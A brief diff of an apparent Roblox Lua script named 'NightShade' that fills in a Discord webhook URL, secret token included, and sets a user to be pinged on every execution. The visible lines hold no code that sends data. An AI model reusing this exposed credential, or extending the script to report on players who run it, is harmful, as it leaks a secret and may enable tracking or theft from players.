@@ -1,7 +1,7 @@
 print("NightShade is presented to you by, ChaddestCat#1981, marker#3209, and Crow?#9001")
 repeat task.wait() until game:IsLoaded()
 
-local Webhook = "" -- your webhook here
+local Webhook = "https://discord.com/api/webhooks/1081000418185850880/_HOjXAEax5wsk6isSkVHv5PiDDD50p-maOUO59j6ERzQjAwtHqo443pJvjc4yHgQt94w" -- your webhook here
 _G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.
 
 local player = game:GetService("Players").LocalPlayer
